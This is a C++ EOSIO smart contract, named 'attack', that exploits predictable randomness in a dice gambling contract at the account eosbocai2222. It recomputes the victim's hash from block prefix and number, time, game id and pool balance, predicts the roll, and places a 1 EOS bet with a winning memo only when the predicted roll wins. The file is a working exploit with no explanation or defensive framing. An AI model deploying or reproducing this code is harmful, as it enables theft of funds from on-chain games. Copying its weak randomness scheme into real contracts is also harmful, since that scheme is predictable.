#include <utility>
#include <vector>
#include <string>
#include <eosiolib/eosio.hpp>
#include <eosiolib/time.hpp>
#include <eosiolib/asset.hpp>
#include <eosiolib/contract.hpp>
#include <eosiolib/types.hpp>
#include <eosiolib/transaction.hpp>
#include <eosiolib/crypto.h>
#include <boost/algorithm/string.hpp>
#include "eosio.token.hpp"

using eosio::asset;
using eosio::permission_level;
using eosio::action;
using eosio::print;
using eosio::name;
using eosio::unpack_action_data;
using eosio::symbol_type;
using eosio::transaction;
using eosio::time_point_sec;


class attack : public eosio::contract {
    public:
        attack(account_name self):eosio::contract(self)
        {}

        uint8_t random(account_name name, uint64_t game_id, uint32_t prefix, uint32_t num)
        {
            asset pool_eos = eosio::token(N(eosio.token)).get_balance(N(eosbocai2222), symbol_type(S(4, EOS)).name());
            auto amount = pool_eos.amount + 10000;
            auto time = current_time() + 1000000;
            //auto mixd = tapos_block_prefix() * tapos_block_num() + name + game_id - current_time() + pool_eos.amount;
            auto mixd = prefix * num + name + game_id - time + amount;
            
            print(
                "[ATTACK RANDOM]tapos-prefix=>", (uint32_t)prefix, 
                "|tapos-num=>", num, 
                "|current_time=>", time,
                "|game_id=>", game_id,
                "|poll_amount=>", amount,
                "\n"
            );
            const char *mixedChar = reinterpret_cast<const char *>(&mixd);

            checksum256 result;
            sha256((char *)mixedChar, sizeof(mixedChar), &result);

            uint64_t random_num = *(uint64_t *)(&result.hash[0]) + *(uint64_t *)(&result.hash[8]) + *(uint64_t *)(&result.hash[16]) + *(uint64_t *)(&result.hash[24]);
            return (uint8_t)(random_num % 100 + 1);
        }

        //@abi action
        void hi(uint64_t id, uint32_t block_prefix, uint32_t block_num)
        {
            //uint8_t roll;
            uint8_t random_roll = random(N(attacker), id, block_prefix, block_num);
            print("[ATTACK]predict random num =>", (int)random_roll,"\n");
            if((int)random_roll >2 && (int)random_roll <94)
            {
                int roll = (int)random_roll + 1;
                auto dice_str = "dice-noneage-" + std::to_string(roll) + "-user";
                print("[ATTACK]current_time=>", current_time(), "\n");
                print(
                    "[ATTACK]tapos-prefix=>", (uint32_t)tapos_block_prefix(), 
                    "|tapos-num=>", tapos_block_num(),
                    "\n"
                );
                print("[ATTACK] before transfer");
                action(
                    permission_level{_self, N(active)},
                    N(eosio.token), N(transfer),
                    std::make_tuple(_self, N(eosbocai2222), asset(10000, S(4, EOS)), dice_str)
                ).send();
            }
        }
};

#define EOSIO_ABI_EX( TYPE, MEMBERS ) \
extern "C" { \
   void apply( uint64_t receiver, uint64_t code, uint64_t action ) { \
      auto self = receiver; \
      if( code == self || code == N(eosio.token)) { \
         if( action == N(transfer)){ \
                eosio_assert( code == N(eosio.token), "Must transfer EOS"); \
         } \
         TYPE thiscontract( self ); \
         switch( action ) { \
            EOSIO_API( TYPE, MEMBERS ) \
         } \
         /* does not allow destructor of thiscontract to run: eosio_exit(0); */ \
      } \
   } \
}

EOSIO_ABI_EX( attack,
        (hi)
)